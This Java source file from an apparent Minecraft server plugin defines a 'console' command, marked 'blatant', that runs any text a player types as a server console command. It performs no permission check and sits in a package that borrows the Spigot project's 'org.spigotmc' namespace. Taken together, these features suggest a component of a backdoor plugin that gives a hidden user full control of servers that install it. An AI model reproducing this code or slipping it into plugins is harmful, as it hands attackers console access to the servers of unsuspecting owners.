package org.spigotmc.commands.impl.server;

import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.methods.API;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "console",
    desc = "Send command to console",
    usage = "console <command>",
    blatant = true
)
public class Console extends CommandListener {

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (args.length < 2) {
            p.sendMessage(Settings.USAGE(Console.class.getAnnotation(CommandInfo.class).usage()));
        } else {
            StringBuilder cmd = new StringBuilder();
            for (int i = 1; i < args.length; i++) {
                cmd.append(args[i]).append(" ");
            }
            
            String command = cmd.toString().trim(); 
            
            API.sendCommandToConsole(command);
            p.sendMessage(Settings.PREFIX("You executed " + Settings.PURPLE + command + Settings.WHITE + " from the console"));
        }
    }
}
